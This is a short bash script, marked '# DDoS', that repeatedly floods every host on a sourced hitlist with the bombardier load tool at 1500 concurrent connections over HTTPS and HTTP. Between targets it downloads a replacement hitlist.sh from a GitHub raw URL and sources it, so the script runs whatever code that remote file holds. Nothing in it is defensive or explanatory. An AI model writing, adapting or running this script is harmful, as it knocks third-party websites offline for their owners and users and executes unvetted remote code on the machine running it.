#!/bin/bash

. ./hitlist.sh

list=("${hitlist[@]}")

for n in {1..1000}; do
    for (( i = 0; i < ${#list[@]}; i++ ))
    do
        
        # DDoS
        echo "Hitting - ${list[i]}"
        bombardier -c 1500 -d 60s -l https://${list[i]} --http1
        echo "Switching to http"
        sleep 2
        bombardier -c 1500 -d 60s -l http://${list[i]} --http1
        echo "Hit - ${list[i]}"
        sleep 2
        
        # Fetch and load new hitlist into memory
        echo "Fetching new hitlist..."
        curl -LJO  https://raw.githubusercontent.com/v1adko/javelin/master/hitlist.sh
        sleep 1
        . ./hitlist.sh
        
        #  If it's different from the current list - restart the queue
        if [ "${list[0]}" != "${hitlist[0]}" ]; then
            echo "Fetched new hitlist, restarting..."
            list=("${hitlist[@]}")
            i=-1
        fi
    done
done
